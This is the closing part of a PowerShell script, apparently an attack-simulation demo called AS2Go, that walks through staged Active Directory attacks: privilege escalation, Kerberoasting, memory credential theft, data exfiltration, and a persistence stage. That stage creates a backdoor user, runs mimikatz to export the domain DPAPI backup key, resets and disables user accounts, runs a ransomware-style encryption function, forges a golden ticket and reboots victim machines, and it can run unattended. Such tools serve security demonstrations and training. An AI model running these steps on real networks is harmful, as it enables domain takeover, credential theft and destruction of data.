            elseif ($answer -eq $KrA) {
                If ($showStep) { Show-Step -step step_007_PtT.html } 
                New-KerberoastingAttack
            }
            elseif ($answer -eq $CfM) {
                If ($showStep) { Show-Step -step step_007_PtT.html } 
                New-CredentialTheftThroughMemoryAccess
            }

            elseif ($answer -eq "E") {
                If ($showStep) { Show-Step -step step_007_PtT.html } 
                Set-UseLogonCredential
            }

          

            elseif ($answer -eq "X") {
                If ($showStep) { Show-Step -step step_007_PtT.html } 
                New-PrivilegesEscalationtoSystem
            }

            else {
                Write-Host "Privilege Escalation was skipped" -ForegroundColor red
            }


            Clear-Host

            Write-Host "____________________________________________________________________`n" 
            Write-Host "        ??? REPEAT | Privilege Escalation  ???           "
            Write-Host "____________________________________________________________________`n" 

            # End "Do ... Until" Loop?

            If ($UnAttended) {
                $repeat = $no
            }
            else {
                $question = "Do you need to REPEAT this attack level - Y or N? Default "
                $repeat = Get-Answer -question $question -defaultValue $no 
            }
   
        } Until ($repeat -eq $no)

    }

    #endregion Attack Level - Privilege Escalation

    ################################################################################
    ######                                                                     #####
    ######      Attack Level - Steal or Forge Authentication Certificates      #####
    ######                                                                     #####
    ################################################################################

    #region Attack Level - Forge Authentication Certificates
    
    If ($SkipForgeAuthCertificates) {
        Write-Log -Message "Skipped Attack Level - Steal or Forge Authentication Certificates "
    }
    else {

    }

    #endregion Attack Level - Forge Authentication Certificates


    ################################################################################
    ######                                                                     #####
    ######                Attack Level -  Kerberoasting Attack                 #####
    ######                                                                     ##### 
    ######     technique used by attackers, which allows them to request       #####
    ######     a service ticket for any service with a registered SPN          #####
    ######                                                                     #####
    ################################################################################

    #region Attack Level -  Kerberoasting Attack

    If ($SkipKerberoastingAttack) {
        Write-Log -Message "Skipped Attack Level - Kerberoasting Attack"
    }
    else {



    }
    #endregion Attack Level -  Kerberoasting Attack


    ################################################################################
    ######                                                                     #####
    ######                Attack Level - ACCESS SENSITIVE DATA                 #####
    ######                                                                     #####
    ################################################################################

    #region Attack Level -  ACCESS SENSITIVE DATA
    If ($SkipSensitiveDataAccess) {
        Write-Log -Message "Skipped Attack Level - ACCESS SENSITIVE DATA "
    }
    else {
        Update-WindowTitle -NewTitle $stage30
        Set-KeyValue -key "LastStage" -NewValue $stage30
        If ($showStep) { Show-Step "step_010.html" }

        Do {

            Clear-Host

            Write-Host "____________________________________________________________________`n" 
            Write-Host "                Attack Level - ACCESS SENSITIVE DATA                "
            Write-Host "              Try to find and exfiltrate sensitive data            "
            Write-Host "____________________________________________________________________`n" 



            If ($UnAttended) {
                $answer = $Yes
            }
            else {
                $question = "Do you want to run this step - Y or N? Default "
                $answer = Get-Answer -question $question -defaultValue $Yes
            }

            If ($answer -eq $yes) {

                Start-Exfiltration
    
            }

            Clear-Host

            Write-Host "____________________________________________________________________`n" 
            Write-Host "        ??? REPEAT | Attack Level - ACCESS SENSITIVE DATA  ???      "
            Write-Host "____________________________________________________________________`n" 


            If ($UnAttended) {
                $repeat = $no
            }
            else {
                $question = "Do you need to REPEAT this attack level - Y or N? Default "
                $repeat = Get-Answer -question $question -defaultValue $no
            }
   
        } Until ($repeat -eq $no)
    }
    #endregion Attack Level -  ACCESS SENSITIVE DATA

    ################################################################################
    ######                                                                     #####
    ######                Attack Level - DOMAIN COMPROMISED AND PERSISTENCE    #####
    ######                                                                     #####
    ################################################################################

    #region Attack Level -  DOMAIN COMPROMISED AND PERSISTENCE
    If ($SkipDomainPersistence) {
        Write-Log -Message "Skipped Attack Level - DOMAIN COMPROMISED AND PERSISTENCE"
    }
    else {

        Update-WindowTitle -NewTitle $stage40
        Set-KeyValue -key "LastStage" -NewValue $stage40
        If ($showStep) { Show-Step step_012.html }
        Do {
            Clear-Host
            Write-Host "____________________________________________________________________`n" 
            Write-Host "          Attack Level - DOMAIN COMPROMISED AND PERSISTENCE         "
            Write-Host "____________________________________________________________________`n" 
            Write-Host "               Step #1 - create a backdoor user"
            Write-Host "               Step #2 - export DPAPI master key"
            Write-Host "               Step #3 - PW reset and disable users"
            Write-Host "               Step #4 - Encrypt files"
            Write-Host "               Step #5 - create golden ticket"
            Write-Host "               Step #6 - reboot (all machines)"  

            If ($UnAttended) {
                $answer = $yes 
            }
            else {
                $question = "Do you want to run these steps - Y or N? Default "
                $answer = Get-Answer -question $question -defaultValue $Yes
            }

            If ($answer -eq $yes) {
                Clear-Host

    

                Write-Host "____________________________________________________________________`n" 
                Write-Host "        Create a backdoor USER and add it to Sensitive Groups           "
                Write-Host "____________________________________________________________________`n"     
    
                If ($UnAttended) {
                    $answer = $yes 
                }
                else {
                    $question = "Do you want to run these steps - Y or N? Default "
                    $answer = Get-Answer -question $question -defaultValue $Yes
                }

                If ($answer -eq $yes) {
                    New-BackDoorUser
                    If ($UnAttended) { Start-Sleep 2 } else { Pause }
                } 
    
                #Pause
                Clear-Host
                Write-Host "____________________________________________________________________`n" 
                Write-Host "        try to export DATA PROTECTION API master key                "
                Write-Host ""
                write-host "    Attackers can use the master key to decrypt ANY secret "         
                Write-Host "        protected by DPAPI on all domain-joined machines"
                Write-Host "____________________________________________________________________`n"     
                write-host ""
                Write-Host      -NoNewline "  Command: "
                Write-Highlight -Text ".\mimikatz.exe ", """cd $exfiltration"" ", """privilege::", "debug", """ ""lsadump::", "backupkeys ", "/system:", "$mydc.$fqdn", " /export", """ ""exit"""  `
                    -Color $fgcC, $fgcV, $fgcF, $fgcV, $fgcF, $fgcV, $fgcS, $fgcV, $fgcS, $fgcF
                Write-Host  ""

                If ($UnAttended) {
                    $answer = $yes 
                }
                else {
                    $question = "Do you want to run these steps - Y or N? Default "
                    $answer = Get-Answer -question $question -defaultValue $Yes
                }

                If ($answer -eq $yes) {
                    New-Item $exfiltration -ItemType directory -ErrorAction Ignore
                    Invoke-Command -ScriptBlock { .\mimikatz.exe "cd $exfiltration" "privilege::debug" "lsadump::backupkeys /system:$mydc.$fqdn /export" "exit" }
                    write-host ""
                    Write-Host      -NoNewline "  Command: "
                    Write-Highlight -Text "get-item ", "$exfiltration\ntds_*"  `
                        -Color $fgcC, $fgcV
                    Write-Host  ""   
                    get-item "$exfiltration\ntds_*" | out-host
                    If ($UnAttended) { Start-Sleep 2 } else { Pause }
                }
   
                Clear-Host
                Write-Host "____________________________________________________________________`n" 
                Write-Host "            User Manipulation - Disable & PW reset                   "
                Write-Host "____________________________________________________________________`n" 
  
                $EmojiIcon = [System.Convert]::toInt32("1F600", 16)
                $Smily = [System.Char]::ConvertFromUtf32($EmojiIcon)

    
                Write-host "  ... will ignore your new backdoor user " -NoNewline
                Write-host $global:BDUser -ForegroundColor $global:FGCHighLight -NoNewline
                Write-Host " - $Smily"
        
                If ($UnAttended) {
                    $answer = $yes 
                }
                else {
                    $question = "Do you want to run these steps - Y or N? Default "
                    $answer = Get-Answer -question $question -defaultValue $Yes
                }

                If ($answer -eq $yes) {
                    $MySearchBase = Get-KeyValue -key "MySearchBase"
                    Start-UserManipulation -SearchBase $MySearchBase
                    If ($UnAttended) { Start-Sleep 2 } else { Pause }
                } 


                #Pause
                Clear-Host
                Write-Host "____________________________________________________________________`n" 
                Write-Host "                 ran ransomware attack?                               "
                Write-Host "____________________________________________________________________`n"     
    
                If ($UnAttended) {
                    $answer = $yes 
                }
                else {
                    $question = "Do you want to run these steps - Y or N? Default "
                    $answer = Get-Answer -question $question -defaultValue $Yes
                }

                If ($answer -eq $yes) {
                    #run functions
                    New-RansomareAttack -BackupShare $OfflineDITFile
                    If ($UnAttended) { Start-Sleep 2 } else { Pause }
                }
 
    
                Clear-Host
                Write-Host "____________________________________________________________________`n" 
                Write-Host "        create golden ticket for an unknown user                    "
                Write-Host "____________________________________________________________________`n"     

                If ($UnAttended) {
                    $answer = $no 
                }
                else {
                    $question = "Do you want to run these steps - Y or N? Default "
                    $answer = Get-Answer -question $question -defaultValue $Yes
                }

                If ($answer -eq $yes) {

                    #run function
                    New-GoldenTicket
                } 
    
                #Pause
                Clear-Host
                Write-Host "____________________________________________________________________`n" 
                Write-Host "                 reboot (all machines)                              "
                Write-Host "____________________________________________________________________`n"     
    
                If ($UnAttended) {
                    $answer = $yes 
                }
                else {
                    $question = "Do you want to run these steps - Y or N? Default "
                    $answer = Get-Answer -question $question -defaultValue $Yes
                }

                If ($answer -eq $yes) {
                    #run functions
                    Stop-AS2GoDemo -NextStepReboot $yes
                    Restart-VictimMachines
                }
            }
            Clear-Host

            Write-Host "____________________________________________________________________`n" 
            Write-Host "        ??? REPEAT | Attack Level - DOMAIN COMPROMISED ???          "
            Write-Host "____________________________________________________________________`n" 


            $question = "Do you need to REPEAT this attack level - Y or N? Default "
            $repeat = Get-Answer -question $question -defaultValue $no

   
        } Until ($repeat -eq $no)

    }
    #endregion Attack Level -  DOMAIN COMPROMISED AND PERSISTENCE

    ################################################################################
    ######                                                                     #####
    ######                         CLEAN UP                                    #####
    ######                                                                     #####
    ################################################################################

    Stop-AS2GoDemo


    <# Ideen 


enter-pssession -ComputerName Ch01-DSP-MGMT


try
{
#https://www.hackingarticles.in/credential-dumping-wdigest/

$UseLogonCredential = Get-ItemPropertyValue -Name UseLogonCredential -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
Write-Host $UseLogonCredential
}
catch
{
Write-Host Get-ItemPropertyValue : Property UseLogonCredential does not exist at path -ForegroundColor yellow
}

try
{
$UseLogonCredential = Get-ItemPropertyValue -Name UseLogonCredential -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
}
catch
{
Write-Host Get-ItemPropertyValue : Property UseLogonCredential does not exist at path -ForegroundColor yellow
}

Get-ChildItem ??-*.* | Move-Item -Destination .\Clean-up -Force

#>
}


Start-AS2GoDemo
